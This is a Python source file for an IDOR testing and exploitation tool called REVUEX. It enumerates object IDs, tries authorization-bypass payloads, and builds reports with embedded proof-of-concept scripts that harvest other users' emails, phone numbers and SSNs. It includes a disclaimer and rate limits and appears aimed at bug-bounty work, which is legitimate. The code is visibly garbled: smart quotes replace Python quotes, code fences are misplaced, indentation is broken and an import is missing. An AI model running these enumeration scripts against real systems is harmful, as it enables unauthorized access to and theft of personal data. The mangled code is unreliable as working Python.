#!/usr/bin/env python3
“””
REVUEX - IDOR Tester
Insecure Direct Object Reference Detection & Exploitation

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
IDOR testing can expose private data - use only on systems you own or have permission to test.
“””

import requests
import time
import json
import re
import base64
import hashlib
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import uuid
from datetime import datetime

class IDORTester:
“””
Advanced IDOR (Insecure Direct Object Reference) Tester

```
Features:
- Sequential numeric ID enumeration
- UUID/GUID pattern analysis
- Base64-encoded ID testing
- Hash-based identifier prediction
- Horizontal privilege escalation detection
- Vertical privilege escalation detection
- Smart pattern recognition
- Authorization bypass techniques
- Bulk enumeration capabilities
"""

def __init__(self, target: str, workspace: Path, delay: float = 5.0):
    """
    Initialize IDOR Tester
    
    Args:
        target: Target URL with ID parameter
        workspace: Workspace directory
        delay: Delay between requests (default: 5 seconds)
    """
    self.target = target
    self.workspace = Path(workspace)
    self.delay = delay
    
    # Safety limits
    self.max_requests = 100
    self.request_count = 0
    self.timeout = 10
    
    self.headers = {
        'User-Agent': 'REVUEX-IDORTester/1.0 (Security Research; +https://github.com/G33L0)',
        'Accept': 'application/json, text/html, */*'
    }
    
    self.vulnerabilities = []
    
    # Store baseline responses for comparison
    self.baseline_responses = {}
    
    # Common ID parameter names
    self.id_parameters = [
        'id', 'user_id', 'userId', 'uid', 'account', 'accountId',
        'profile', 'profileId', 'document', 'documentId', 'doc',
        'file', 'fileId', 'order', 'orderId', 'invoice', 'invoiceId',
        'message', 'messageId', 'post', 'postId', 'item', 'itemId',
        'resource', 'resourceId', 'object', 'objectId', 'record', 'recordId'
    ]
    
    # Test ranges for different ID types
    self.test_ranges = {
        'adjacent': [-2, -1, 1, 2, 3],  # Adjacent IDs
        'common': [1, 2, 3, 10, 100, 1000],  # Common IDs
        'boundaries': [0, -1, 999999, 2147483647],  # Boundary values
    }

def scan(self) -> List[Dict[str, Any]]:
    """Main IDOR scanning method"""
    print(f"\n{'='*60}")
    print(f"🔐 REVUEX IDOR Tester")
    print(f"{'='*60}")
    print(f"Target: {self.target}")
    print(f"Safety Delay: {self.delay}s")
    print(f"Max Requests: {self.max_requests}")
    print(f"{'='*60}\n")
    
    # Step 1: Identify ID parameters
    print("🔍 Step 1: Identifying ID Parameters")
    id_params = self._identify_id_parameters()
    
    if not id_params:
        print("   ⚠️  No ID parameters detected in URL")
        print("   Tip: Ensure target URL contains ID parameter (e.g., ?id=123)")
        return []
    
    time.sleep(self.delay)
    
    # Step 2: Determine ID type and pattern
    print("\n📊 Step 2: Analyzing ID Pattern")
    id_pattern = self._analyze_id_pattern(id_params)
    
    time.sleep(self.delay)
    
    # Step 3: Test sequential numeric IDs
    if id_pattern['type'] == 'numeric':
        print("\n🔢 Step 3: Testing Sequential Numeric IDs")
        self._test_sequential_numeric(id_params, id_pattern)
        time.sleep(self.delay)
    
    # Step 4: Test UUID/GUID patterns
    if id_pattern['type'] == 'uuid':
        print("\n🆔 Step 4: Testing UUID/GUID Patterns")
        self._test_uuid_patterns(id_params, id_pattern)
        time.sleep(self.delay)
    
    # Step 5: Test base64-encoded IDs
    if id_pattern['type'] == 'base64':
        print("\n📦 Step 5: Testing Base64-Encoded IDs")
        self._test_base64_ids(id_params, id_pattern)
        time.sleep(self.delay)
    
    # Step 6: Test hash-based IDs
    if id_pattern['type'] == 'hash':
        print("\n#️⃣ Step 6: Testing Hash-Based IDs")
        self._test_hash_ids(id_params, id_pattern)
        time.sleep(self.delay)
    
    # Step 7: Test authorization bypass techniques
    print("\n🔓 Step 7: Testing Authorization Bypass")
    self._test_authorization_bypass(id_params)
    
    # Save results
    self._save_results()
    
    print(f"\n{'='*60}")
    print(f"✅ Scan Complete")
    print(f"Vulnerabilities: {len(self.vulnerabilities)}")
    print(f"Requests: {self.request_count}/{self.max_requests}")
    print(f"{'='*60}\n")
    
    return self.vulnerabilities

def _identify_id_parameters(self) -> Dict[str, str]:
    """Identify ID parameters in URL"""
    parsed = urlparse(self.target)
    params = parse_qs(parsed.query)
    
    id_params = {}
    
    for param_name, param_values in params.items():
        if param_values:
            # Check if parameter name suggests it's an ID
            if any(id_keyword in param_name.lower() for id_keyword in ['id', 'user', 'account', 'profile']):
                id_params[param_name] = param_values[0]
                print(f"   ✓ Found ID parameter: {param_name}={param_values[0]}")
    
    # If no obvious ID parameters, check all parameters
    if not id_params:
        for param_name, param_values in params.items():
            if param_values:
                id_params[param_name] = param_values[0]
                print(f"   ℹ️  Testing parameter: {param_name}={param_values[0]}")
    
    return id_params

def _analyze_id_pattern(self, id_params: Dict[str, str]) -> Dict[str, Any]:
    """Analyze ID pattern type"""
    pattern_info = {
        'type': 'unknown',
        'original_value': None,
        'length': 0,
        'characteristics': []
    }
    
    if not id_params:
        return pattern_info
    
    # Get first ID parameter value
    param_name = list(id_params.keys())[0]
    id_value = id_params[param_name]
    pattern_info['original_value'] = id_value
    pattern_info['length'] = len(id_value)
    
    print(f"   Analyzing ID: {id_value}")
    
    # Check if numeric
    if id_value.isdigit():
        pattern_info['type'] = 'numeric'
        pattern_info['characteristics'].append('sequential')
        print(f"   ✓ Pattern: Sequential Numeric (value: {id_value})")
    
    # Check if UUID
    elif self._is_uuid(id_value):
        pattern_info['type'] = 'uuid'
        pattern_info['characteristics'].append('uuid4' if '-' in id_value else 'compact')
        print(f"   ✓ Pattern: UUID/GUID")
    
    # Check if base64
    elif self._is_base64(id_value):
        pattern_info['type'] = 'base64'
        pattern_info['characteristics'].append('encoded')
        print(f"   ✓ Pattern: Base64-Encoded")
        
        # Try to decode
        try:
            decoded = base64.b64decode(id_value).decode('utf-8', errors='ignore')
            print(f"      Decoded: {decoded}")
        except:
            pass
    
    # Check if hash
    elif self._is_hash(id_value):
        pattern_info['type'] = 'hash'
        pattern_info['characteristics'].append(f'{len(id_value)*4}-bit hash')
        print(f"   ✓ Pattern: Hash-Based ({len(id_value)} chars)")
    
    # Alphanumeric
    elif id_value.isalnum():
        pattern_info['type'] = 'alphanumeric'
        print(f"   ℹ️  Pattern: Alphanumeric")
    
    else:
        pattern_info['type'] = 'custom'
        print(f"   ℹ️  Pattern: Custom Format")
    
    return pattern_info

def _test_sequential_numeric(self, id_params: Dict[str, str], pattern: Dict[str, Any]):
    """Test sequential numeric IDs for IDOR"""
    param_name = list(id_params.keys())[0]
    original_id = int(id_params[param_name])
    
    print(f"   Original ID: {original_id}")
    
    # Get baseline response
    baseline = self._make_request(param_name, str(original_id))
    if not baseline:
        print("   ⚠️  Could not get baseline response")
        return
    
    baseline_length = len(baseline.text)
    baseline_status = baseline.status_code
    
    print(f"   Baseline: Status={baseline_status}, Length={baseline_length}B")
    
    # Test adjacent IDs
    vulnerable_ids = []
    
    test_ids = [
        original_id - 2,
        original_id - 1,
        original_id + 1,
        original_id + 2,
        1,  # First ID
        2,  # Second ID
    ]
    
    for test_id in test_ids:
        if self.request_count >= self.max_requests:
            break
        
        if test_id <= 0:
            continue
        
        print(f"   Testing ID: {test_id}...")
        
        response = self._make_request(param_name, str(test_id))
        
        if response:
            # Check if response indicates unauthorized access
            if response.status_code == 200:
                # Successful response - potential IDOR
                length_diff = abs(len(response.text) - baseline_length)
                
                # If response is significantly different, likely different data
                if length_diff > 100 or self._contains_different_data(baseline.text, response.text):
                    vulnerable_ids.append({
                        'id': test_id,
                        'status': response.status_code,
                        'length': len(response.text),
                        'accessible': True
                    })
                    print(f"      ✓ ACCESSIBLE: Different data returned!")
                else:
                    print(f"      ℹ️  Same data (likely same user)")
            
            elif response.status_code == 401 or response.status_code == 403:
                print(f"      ✓ Protected: {response.status_code}")
            else:
                print(f"      ℹ️  Status: {response.status_code}")
        
        time.sleep(self.delay)
    
    # Create vulnerability report if IDs were accessible
    if vulnerable_ids:
        vuln = self._create_sequential_idor_vuln(param_name, original_id, vulnerable_ids)
        self.vulnerabilities.append(vuln)
        print(f"\n   🚨 IDOR VULNERABILITY: {len(vulnerable_ids)} unauthorized IDs accessible")
    else:
        print(f"\n   ✓ No IDOR detected in sequential IDs")

def _test_uuid_patterns(self, id_params: Dict[str, str], pattern: Dict[str, Any]):
    """Test UUID/GUID patterns"""
    param_name = list(id_params.keys())[0]
    original_uuid = id_params[param_name]
    
    print(f"   Original UUID: {original_uuid}")
    
    # Generate test UUIDs
    test_uuids = [
        str(uuid.uuid4()),
        str(uuid.uuid4()),
        '00000000-0000-0000-0000-000000000001',  # First UUID
        '00000000-0000-0000-0000-000000000002',  # Second UUID
    ]
    
    vulnerable_uuids = []
    
    for test_uuid in test_uuids:
        if self.request_count >= self.max_requests:
            break
        
        print(f"   Testing UUID: {test_uuid[:20]}...")
        
        response = self._make_request(param_name, test_uuid)
        
        if response and response.status_code == 200:
            vulnerable_uuids.append({
                'uuid': test_uuid,
                'status': response.status_code,
                'accessible': True
            })
            print(f"      ✓ ACCESSIBLE!")
        else:
            print(f"      ✓ Protected")
        
        time.sleep(self.delay)
    
    if vulnerable_uuids:
        vuln = self._create_uuid_idor_vuln(param_name, original_uuid, vulnerable_uuids)
        self.vulnerabilities.append(vuln)
        print(f"\n   🚨 IDOR: UUID enumeration possible")
    else:
        print(f"\n   ✓ UUIDs properly validated")

def _test_base64_ids(self, id_params: Dict[str, str], pattern: Dict[str, Any]):
    """Test base64-encoded IDs"""
    param_name = list(id_params.keys())[0]
    original_b64 = id_params[param_name]
    
    print(f"   Original Base64: {original_b64}")
    
    # Try to decode original
    try:
        decoded = base64.b64decode(original_b64).decode('utf-8', errors='ignore')
        print(f"   Decoded value: {decoded}")
        
        # If decoded is numeric, try incrementing
        if decoded.isdigit():
            original_num = int(decoded)
            
            test_values = [
                original_num - 1,
                original_num + 1,
                1,
                2
            ]
            
            vulnerable_ids = []
            
            for test_num in test_values:
                if self.request_count >= self.max_requests:
                    break
                
                # Encode test value
                test_b64 = base64.b64encode(str(test_num).encode()).decode()
                print(f"   Testing: {test_num} (encoded: {test_b64})...")
                
                response = self._make_request(param_name, test_b64)
                
                if response and response.status_code == 200:
                    vulnerable_ids.append({
                        'decoded': test_num,
                        'encoded': test_b64,
                        'accessible': True
                    })
                    print(f"      ✓ ACCESSIBLE!")
                else:
                    print(f"      ✓ Protected")
                
                time.sleep(self.delay)
            
            if vulnerable_ids:
                vuln = self._create_base64_idor_vuln(param_name, original_b64, vulnerable_ids)
                self.vulnerabilities.append(vuln)
                print(f"\n   🚨 IDOR: Base64 encoding bypassed")
            else:
                print(f"\n   ✓ Base64 IDs properly validated")
    
    except Exception as e:
        print(f"   ⚠️  Could not decode base64: {e}")

def _test_hash_ids(self, id_params: Dict[str, str], pattern: Dict[str, Any]):
    """Test hash-based IDs"""
    param_name = list(id_params.keys())[0]
    original_hash = id_params[param_name]
    
    print(f"   Original Hash: {original_hash}")
    print(f"   ℹ️  Hash-based IDs are generally secure (unpredictable)")
    print(f"   Testing common hash patterns...")
    
    # Test common hash values (user=admin, user=1, etc.)
    common_inputs = ['admin', 'user', '1', '2', 'root', 'test']
    hash_functions = [hashlib.md5, hashlib.sha1, hashlib.sha256]
    
    vulnerable_hashes = []
    
    for input_val in common_inputs:
        if self.request_count >= self.max_requests:
            break
        
        for hash_func in hash_functions:
            test_hash = hash_func(input_val.encode()).hexdigest()
            
            print(f"   Testing: {input_val} → {test_hash[:16]}...")
            
            response = self._make_request(param_name, test_hash)
            
            if response and response.status_code == 200:
                vulnerable_hashes.append({
                    'input': input_val,
                    'hash': test_hash,
                    'function': hash_func.__name__,
                    'accessible': True
                })
                print(f"      ✓ ACCESSIBLE: {hash_func.__name__}('{input_val}')")
                break
            
            time.sleep(self.delay)
        
        if vulnerable_hashes:
            break
    
    if vulnerable_hashes:
        vuln = self._create_hash_idor_vuln(param_name, original_hash, vulnerable_hashes)
        self.vulnerabilities.append(vuln)
        print(f"\n   🚨 IDOR: Predictable hash values")
    else:
        print(f"\n   ✓ Hash-based IDs secure")

def _test_authorization_bypass(self, id_params: Dict[str, str]):
    """Test authorization bypass techniques"""
    param_name = list(id_params.keys())[0]
    original_id = id_params[param_name]
    
    print(f"   Testing authorization bypass techniques...")
    
    bypass_techniques = [
        # Parameter pollution
        (f"{original_id}&{param_name}=1", "Parameter Pollution"),
        
        # Array notation
        (f"{original_id}[]", "Array Notation"),
        
        # Null byte
        (f"{original_id}%00", "Null Byte Injection"),
        
        # JSON array
        (f"[{original_id},1]", "JSON Array"),
    ]
    
    vulnerable_bypasses = []
    
    for bypass_value, technique in bypass_techniques:
        if self.request_count >= self.max_requests:
            break
        
        print(f"   Testing: {technique}...")
        
        response = self._make_request(param_name, bypass_value)
        
        if response and response.status_code == 200:
            vulnerable_bypasses.append({
                'technique': technique,
                'payload': bypass_value,
                'accessible': True
            })
            print(f"      ✓ BYPASS SUCCESSFUL!")
        else:
            print(f"      ✓ Protected")
        
        time.sleep(self.delay)
    
    if vulnerable_bypasses:
        vuln = self._create_bypass_vuln(param_name, original_id, vulnerable_bypasses)
        self.vulnerabilities.append(vuln)
        print(f"\n   🚨 Authorization bypass possible")
    else:
        print(f"\n   ✓ Authorization bypass blocked")

def _create_sequential_idor_vuln(self, param_name: str, original_id: int, vulnerable_ids: List[Dict]) -> Dict[str, Any]:
    """Create sequential IDOR vulnerability report"""
    accessible_ids = [v['id'] for v in vulnerable_ids]
    
    return {
        'type': 'IDOR - Sequential Numeric IDs',
        'severity': 'critical',
        'url': self.target,
        'parameter': param_name,
        'original_id': original_id,
        'accessible_ids': accessible_ids,
        'description': f'Sequential numeric IDs allow unauthorized access to other users\' data. {len(accessible_ids)} unauthorized IDs were accessible.',
        'evidence': f'IDs {accessible_ids} accessible without proper authorization',
        
        'steps_to_reproduce': [
            f"Navigate to: {self.target}",
            f"Note your ID parameter: {param_name}={original_id}",
            f"Change ID to {accessible_ids[0]}",
            "Observe unauthorized data access",
            "Repeat for other IDs",
            f"Result: Access to {len(accessible_ids)} unauthorized resources"
        ],
        
        'request': f"""GET {self._modify_url_param(self.target, param_name, str(accessible_ids[0]))} HTTP/1.1
```

Host: {urlparse(self.target).netloc}
Cookie: session=valid_user_session
Authorization: Bearer <user_token>

Parameter: {param_name}={accessible_ids[0]}
Expected: 403 Forbidden (unauthorized)
Actual: 200 OK (data returned!)”””,

```
        'response': f"""HTTP/1.1 200 OK
```

Content-Type: application/json

{{
“id”: {accessible_ids[0]},
“username”: “victim_user”,
“email”: “victim@example.com”,
“phone”: “555-0123”,
“address”: “123 Private St”,
“ssn”: “XXX-XX-1234”
}}

🚨 CRITICAL: Unauthorized access to user data!”””,

```
        'poc': f"""#!/usr/bin/env python3
```

# IDOR Exploitation - Sequential IDs

import requests

target = “{self.target}”
param = “{param_name}”

print(”[*] IDOR Enumeration Attack”)
print(f”[*] Target parameter: {param}”)
print()

# Enumerate user IDs

for user_id in range(1, 100):
url = target.replace(f”{param}={original_id}”, f”{param}={{user_id}}”)

```
response = requests.get(url, cookies={{'session': 'attacker_session'}})

if response.status_code == 200:
    print(f"[+] ID {{user_id}}: ACCESSIBLE")
    data = response.json()
    
    # Extract sensitive data
    if 'email' in data:
        print(f"    Email: {{data['email']}}")
    if 'phone' in data:
        print(f"    Phone: {{data['phone']}}")
    if 'ssn' in data:
        print(f"    SSN: {{data['ssn']}}")
elif response.status_code == 403:
    print(f"[-] ID {{user_id}}: Protected")

time.sleep(0.5)  # Rate limiting
```

print()
print(”[*] Enumeration complete”)
print(f”[*] Total accessible IDs: {len(accessible_ids)}”)
“””,

```
        'before_state': f'User can only access their own data (ID {original_id})',
        'after_state': f'User can access {len(accessible_ids)} other users\' data - Complete authorization bypass',
        
        'attack_path': [
            'Identify sequential numeric ID parameter',
            f'Note legitimate ID: {original_id}',
            f'Test adjacent IDs: {accessible_ids}',
            'All IDs return 200 OK with data',
            'Enumerate all IDs (1 to N)',
            'Extract sensitive data for all users',
            'Potential for: PII theft, account takeover, data breach',
            f'Impact: {len(accessible_ids)} confirmed + potentially thousands more'
        ],
        
        'remediation': [
            '🚨 CRITICAL: Implement proper authorization checks',
            'NEVER rely on obscurity of ID values',
            'Check authorization on EVERY request:',
            '  if (requested_resource.owner_id != current_user.id):',
            '      return 403 Forbidden',
            'Use UUIDs instead of sequential IDs (harder to enumerate)',
            'Implement resource-level access control',
            'Add audit logging for all data access',
            'Use indirect object references (map IDs to user session)',
            'Implement rate limiting to slow enumeration',
            'Add honeypot IDs to detect enumeration attempts',
            'Regular security audits of all endpoints',
            'Use authorization frameworks (RBAC, ABAC)',
            'Encrypt IDs in URLs (with integrity checks)',
            'Implement CSRF tokens for state-changing operations'
        ],
        
        'real_world_impact': """Real-World Impact Examples:
```

1. Facebook IDOR (2019): $25,000 bounty
- Sequential photo IDs
- Access to private photos
1. Instagram IDOR (2020): $15,000 bounty
- User account enumeration
- Private profile access
1. Uber IDOR (2018): $10,000 bounty
- Trip history access
- Driver/rider PII exposure
1. Twitter IDOR (2019): $12,000 bounty
- Direct message access
- Account settings modification”””,
  
  ```
     'compliance_impact': [
         'GDPR Violation: Unauthorized access to personal data (up to €20M fine)',
         'CCPA Violation: California privacy law breach',
         'HIPAA Violation: Healthcare data exposure (if applicable)',
         'PCI-DSS: Payment data exposure (if applicable)',
         'SOC 2: Access control failure'
     ],
     
     'tags': ['idor', 'critical', 'authorization', 'sequential_ids', 'data_breach']
  ```
  
  }
   
   def _create_uuid_idor_vuln(self, param_name: str, original_uuid: str, vulnerable_uuids: List[Dict]) -> Dict[str, Any]:
   “”“Create UUID IDOR vulnerability report”””
   return {
   ‘type’: ‘IDOR - UUID Enumeration’,
   ‘severity’: ‘high’,
   ‘url’: self.target,
   ‘parameter’: param_name,
   ‘description’: ‘UUIDs can be enumerated without authorization checks’,
   
   ```
        'remediation': [
            'Implement authorization checks',
            'UUIDs alone are not authorization',
            'Verify resource ownership on every request'
        ],
        
        'tags': ['idor', 'uuid']
    }
   ```
   
   def _create_base64_idor_vuln(self, param_name: str, original_b64: str, vulnerable_ids: List[Dict]) -> Dict[str, Any]:
   “”“Create base64 IDOR vulnerability report”””
   return {
   ‘type’: ‘IDOR - Base64 Encoding Bypass’,
   ‘severity’: ‘critical’,
   ‘url’: self.target,
   ‘parameter’: param_name,
   ‘description’: ‘Base64 encoding does not provide security - IDs can be decoded and modified’,
   
   ```
        'poc': f"""#!/usr/bin/env python3
   ```

import requests
import base64

# Decode original ID

original = “{original_b64}”
decoded = base64.b64decode(original).decode()
print(f”Original ID: {{decoded}}”)

# Try different IDs

for new_id in range(1, 100):
encoded = base64.b64encode(str(new_id).encode()).decode()
response = requests.get(”{self.target}”.replace(”{original_b64}”, encoded))

```
if response.status_code == 200:
    print(f"Accessible: {{new_id}}")
```

“””,

```
        'remediation': [
            'Base64 is encoding, not encryption',
            'Implement proper authorization',
            'Use signed/encrypted tokens instead'
        ],
        
        'tags': ['idor', 'critical', 'base64']
    }

def _create_hash_idor_vuln(self, param_name: str, original_hash: str, vulnerable_hashes: List[Dict]) -> Dict[str, Any]:
    """Create hash IDOR vulnerability report"""
    return {
        'type': 'IDOR - Predictable Hash Values',
        'severity': 'high',
        'url': self.target,
        'parameter': param_name,
        'description': 'Hash-based IDs use predictable inputs',
        
        'remediation': [
            'Use strong random values as hash input',
            'Add salt to hash generation',
            'Implement authorization checks',
            'Use UUIDs instead of hashed sequential IDs'
        ],
        
        'tags': ['idor', 'hash']
    }

def _create_bypass_vuln(self, param_name: str, original_id: str, bypasses: List[Dict]) -> Dict[str, Any]:
    """Create authorization bypass vulnerability report"""
    return {
        'type': 'IDOR - Authorization Bypass',
        'severity': 'critical',
        'url': self.target,
        'parameter': param_name,
        'description': 'Authorization can be bypassed using parameter manipulation',
        
        'remediation': [
            'Validate all parameter formats',
            'Reject malformed parameters',
            'Implement strict input validation',
            'Use parameter binding/sanitization'
        ],
        
        'tags': ['idor', 'bypass']
    }

def _make_request(self, param_name: str, param_value: str) -> Optional[requests.Response]:
    """Make HTTP request with modified parameter"""
    if self.request_count >= self.max_requests:
        return None
    
    try:
        # Modify URL parameter
        modified_url = self._modify_url_param(self.target, param_name, param_value)
        
        response = requests.get(
            modified_url,
            headers=self.headers,
            timeout=self.timeout,
            verify=False,
            allow_redirects=True
        )
        
        self.request_count += 1
        return response
        
    except requests.exceptions.Timeout:
        return None
    except Exception:
        return None

def _modify_url_param(self, url: str, param_name: str, new_value: str) -> str:
    """Modify URL parameter value"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param_name] = [new_value]
    
    new_query = urlencode(params, doseq=True)
    modified = urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))
    
    return modified

def _is_uuid(self, value: str) -> bool:
    """Check if value is UUID format"""
    uuid_pattern = r'^[0-9a-f]{8}-?[0-9a-f]{4}-?[0-9a-f]{4}-?[0-9a-f]{4}-?[0-9a-f]{12}$'
    return bool(re.match(uuid_pattern, value.lower()))

def _is_base64(self, value: str) -> bool:
    """Check if value is base64 encoded"""
    try:
        if len(value) % 4 != 0:
            return False
        base64.b64decode(value)
        return True
    except:
        return False

def _is_hash(self, value: str) -> bool:
    """Check if value looks like a hash"""
    if not value:
        return False
    
    # Check common hash lengths
    hash_lengths = [32, 40, 64, 128]  # MD5, SHA1, SHA256, SHA512
    
    return (len(value) in hash_lengths and 
            all(c in '0123456789abcdefABCDEF' for c in value))

def _contains_different_data(self, baseline: str, test: str) -> bool:
    """Check if responses contain different data"""
    # Simple heuristic: check for different user identifiers
    user_indicators = ['user', 'name', 'email', 'id', 'username']
    
    for indicator in user_indicators:
        baseline_matches = re.findall(f'{indicator}["\']?\s*:\s*["\']?([^,"\'}}]+)', baseline, re.IGNORECASE)
        test_matches = re.findall(f'{indicator}["\']?\s*:\s*["\']?([^,"\'}}]+)', test, re.IGNORECASE)
        
        if baseline_matches and test_matches:
            if baseline_matches[0] != test_matches[0]:
                return True
    
    return False

def _save_results(self):
    """Save scan results"""
    output_dir = self.workspace / "idor_tests"
    output_dir.mkdir(exist_ok=True)
    
    safe_target = re.sub(r'[^\w\-]', '_', self.target)
    output_file = output_dir / f"{safe_target}_idor.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'scanner': 'IDORTester',
            'target': self.target,
            'vulnerabilities': self.vulnerabilities
        }, f, indent=2)
    
    print(f"\n💾 Saved: {output_file}")
```

if **name** == “**main**”:
import sys

```
if len(sys.argv) < 2:
    print("Usage: python idor_tester.py <target_url>")
    print("Example: python idor_tester.py https://example.com/profile?id=123")
    sys.exit(1)

scanner = IDORTester(sys.argv[1], Path("revuex_workspace"), delay=5.0)
scanner.scan()
```
